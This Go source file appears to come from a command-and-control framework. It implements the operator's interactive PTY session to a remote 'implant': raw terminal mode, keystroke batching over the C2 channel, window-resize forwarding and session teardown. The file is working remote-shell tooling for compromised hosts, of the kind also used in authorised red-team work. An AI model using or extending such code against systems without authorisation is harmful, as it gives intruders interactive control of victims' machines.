//go:build !implantonly

package c2

import (
	"errors"
	"fmt"
	"io"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"

	"golang.org/x/term"
)

const (
	// ptyEscape is Ctrl+] — anywhere in the keystroke stream it ends
	// the session and is not forwarded to the implant.
	ptyEscape = 0x1d
	// ptyOpenTimeout bounds the wait for open-ok/open-fail. It is
	// generous because frames cross the C2 channel at poll latency.
	ptyOpenTimeout = 120 * time.Second
	// ptyBatchBytes flushes accumulated keystrokes once this many are
	// pending. Human typing is slow; batching saves C2 messages (each
	// data frame is a network round trip).
	ptyBatchBytes = 200
	// ptyFlushInterval flushes pending keystrokes periodically so a
	// slow typist still sees responsive echo.
	ptyFlushInterval = 400 * time.Millisecond
	// sigWINCH is SIGWINCH (28 on linux/darwin). Referenced numerically
	// because syscall.SIGWINCH does not exist in the windows build;
	// the notify call below is additionally gated on GOOS.
	sigWINCH = syscall.Signal(0x1c)
)

// ptyClientSession is the operator side of one interactive PTY session.
// send ships a frame toward the implant (SendCommand in production,
// a direct call in tests — injectable). frameCh is fed by the
// orchestrator from module=="pty" results in PollResults.
type ptyClientSession struct {
	send    func(PtyFrame) error
	frameCh chan PtyFrame

	mu      sync.Mutex
	seq     int // outgoing data frame counter
	lastSeq int // last applied inbound data seq (dedupe)

	done      chan struct{}
	once      sync.Once // guards done
	closeOnce sync.Once // guards the close frame
}

func newPtySession(send func(PtyFrame) error) *ptyClientSession {
	return &ptyClientSession{
		send:    send,
		frameCh: make(chan PtyFrame, 256),
		done:    make(chan struct{}),
		lastSeq: -1,
	}
}

// nextSeq allocates the next outgoing data frame seq.
func (s *ptyClientSession) nextSeq() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	n := s.seq
	s.seq++
	return n
}

// stop signals run() to exit. Idempotent.
func (s *ptyClientSession) stop() {
	s.once.Do(func() { close(s.done) })
}

// sendClose ships a single close frame (best effort, at most once).
func (s *ptyClientSession) sendClose() {
	s.closeOnce.Do(func() { _ = s.send(PtyFrame{Op: PtyOpClose}) })
}

// applyData returns payload if f is a fresh inbound data frame, nil if
// it is a duplicate/stale seq. The paced C2 channel is effectively
// ordered, so a simple high-water mark (no reorder buffer) is enough.
func (s *ptyClientSession) applyData(f PtyFrame) []byte {
	payload, err := DecodePtyData(f.Data)
	if err != nil {
		return nil
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if f.Seq <= s.lastSeq {
		return nil
	}
	s.lastSeq = f.Seq
	return payload
}

// run drives the interactive session: keystrokes from in are batched
// into data frames, data frames from frameCh are written to out, and
// the session ends on the escape byte, a close frame, an input error,
// or stop(). Raw-mode terminal setup lives in StartPty so tests can
// drive run with plain pipes.
func (s *ptyClientSession) run(in io.Reader, out io.Writer) error {
	defer s.stop()

	// Reader goroutine: chunks keystrokes so the batcher below can
	// multiplex reads with frame/timer events.
	inputCh := make(chan []byte, 64)
	readErr := make(chan error, 1)
	go func() {
		buf := make([]byte, 256)
		for {
			n, err := in.Read(buf)
			if n > 0 {
				b := make([]byte, n)
				copy(b, buf[:n])
				select {
				case inputCh <- b:
				case <-s.done:
					return
				}
			}
			if err != nil {
				select {
				case readErr <- err:
				case <-s.done:
				}
				return
			}
		}
	}()

	flush := time.NewTicker(ptyFlushInterval)
	defer flush.Stop()

	pending := make([]byte, 0, 2*ptyBatchBytes)
	// sendData ships up to n pending bytes (all if n <= 0).
	sendData := func(n int) {
		if len(pending) == 0 {
			return
		}
		if n <= 0 || n > len(pending) {
			n = len(pending)
		}
		frame := PtyFrame{
			Op:   PtyOpData,
			Seq:  s.nextSeq(),
			Data: EncodePtyData(pending[:n]),
		}
		pending = pending[n:]
		if err := s.send(frame); err != nil {
			// Raw mode may be active: start on a fresh line.
			fmt.Fprintf(os.Stderr, "\r\n[!] pty send: %v\r\n", err)
		}
	}

loop:
	for {
		select {
		case b := <-inputCh:
			escaped := false
			for _, c := range b {
				if c == ptyEscape {
					escaped = true
					break // escape byte and anything after it is dropped
				}
				pending = append(pending, c)
			}
			for len(pending) >= ptyBatchBytes {
				sendData(ptyBatchBytes)
			}
			if escaped {
				break loop
			}
		case <-flush.C:
			sendData(0)
		case f := <-s.frameCh:
			switch f.Op {
			case PtyOpData:
				if p := s.applyData(f); p != nil {
					_, _ = out.Write(p)
				}
			case PtyOpClose:
				break loop
			}
		case <-readErr:
			break loop
		case <-s.done:
			break loop
		}
	}

	sendData(0) // flush whatever the user typed before exiting
	s.sendClose()
	return nil
}

// --- Operator wiring ---

// Operator structs cannot gain fields without editing operator.go, so
// pty sessions live in a package-level registry keyed by operator
// (mirrors operatorTunnels in tunnel_socks.go).
var (
	operatorPtysMu sync.Mutex
	operatorPtys   = make(map[*Operator]*ptyClientSession)
)

// removePty drops s from the registry if it is still the active session.
func removePty(op *Operator, s *ptyClientSession) {
	operatorPtysMu.Lock()
	if operatorPtys[op] == s {
		delete(operatorPtys, op)
	}
	operatorPtysMu.Unlock()
}

// StartPty opens an interactive PTY on the attached implant and runs
// the session until it ends (escape key, remote close, or stdin error).
// Requires an attached agent. Blocks for the life of the session.
func (op *Operator) StartPty() error {
	op.mu.RLock()
	attached := op.attachedClient
	op.mu.RUnlock()
	if attached == "" {
		return errors.New("pty requires an attached agent (use 'attach <id>' first)")
	}

	operatorPtysMu.Lock()
	if _, ok := operatorPtys[op]; ok {
		operatorPtysMu.Unlock()
		return errors.New("pty session already active for this operator (close it first)")
	}
	operatorPtysMu.Unlock()

	cols, rows := 80, 24
	if w, h, err := term.GetSize(int(os.Stdout.Fd())); err == nil && w > 0 && h > 0 {
		cols, rows = w, h
	}

	s := newPtySession(func(f PtyFrame) error {
		_, err := op.SendCommand("pty", f.toArgs())
		return err
	})
	if err := s.send(PtyFrame{Op: PtyOpOpen, Cols: cols, Rows: rows}); err != nil {
		return fmt.Errorf("pty open: %w", err)
	}

	// Register before waiting so the orchestrator can route the
	// implant's open-ok/open-fail frame to us.
	operatorPtysMu.Lock()
	operatorPtys[op] = s
	operatorPtysMu.Unlock()

	// Wait for open-ok / open-fail. The implant sends one of these
	// before any data frame and the channel is FIFO, so no data frame
	// can be consumed (and lost) here ahead of it.
	timer := time.NewTimer(ptyOpenTimeout)
opened:
	for {
		select {
		case f := <-s.frameCh:
			switch f.Op {
			case PtyOpOpenOK:
				timer.Stop()
				break opened
			case PtyOpOpenFail:
				timer.Stop()
				fmt.Printf("[!] PTY open failed: %s\n", f.Data)
				fmt.Println("[*] Falling back: use 'ishell' for a non-interactive shell")
				removePty(op, s)
				return nil // user was informed; not an operator error
			}
		case <-timer.C:
			removePty(op, s)
			return errors.New("pty open timed out (no response from implant)")
		}
	}

	fmt.Println("[*] PTY session active — Ctrl+] to exit")

	// Raw mode on the local terminal: keystrokes go straight to the
	// implant, no line buffering or local echo.
	stdinFd := int(os.Stdin.Fd())
	var oldState *term.State
	if term.IsTerminal(stdinFd) {
		if st, err := term.MakeRaw(stdinFd); err == nil {
			oldState = st
		}
	}
	defer func() {
		if oldState != nil {
			_ = term.Restore(stdinFd, oldState)
		}
	}()

	// Forward window resizes (unix only; SIGWINCH does not exist on
	// windows).
	if runtime.GOOS != "windows" {
		winch := make(chan os.Signal, 1)
		signal.Notify(winch, sigWINCH)
		defer signal.Stop(winch)
		go func() {
			for {
				select {
				case <-s.done:
					return
				case <-winch:
					if w, h, err := term.GetSize(int(os.Stdout.Fd())); err == nil && w > 0 && h > 0 {
						_ = s.send(PtyFrame{Op: PtyOpResize, Cols: w, Rows: h})
					}
				}
			}
		}()
	}

	err := s.run(os.Stdin, os.Stdout)
	removePty(op, s)
	fmt.Print("\r\n[*] PTY session closed\r\n")
	return err
}

// PtyFrameCh returns the channel the orchestrator feeds with pty
// frames parsed (via PtyFrameFromResult) from module=="pty" results in
// PollResults. Returns nil if no pty session is active.
func (op *Operator) PtyFrameCh() chan<- PtyFrame {
	operatorPtysMu.Lock()
	defer operatorPtysMu.Unlock()
	if s, ok := operatorPtys[op]; ok {
		return s.frameCh
	}
	return nil
}

// StopPty is a best-effort teardown (called by the orchestrator on
// operator exit): sends a close frame, unregisters, and unblocks a
// running session.
func (op *Operator) StopPty() {
	operatorPtysMu.Lock()
	s, ok := operatorPtys[op]
	if ok {
		delete(operatorPtys, op)
	}
	operatorPtysMu.Unlock()
	if ok {
		s.sendClose()
		s.stop()
	}
}
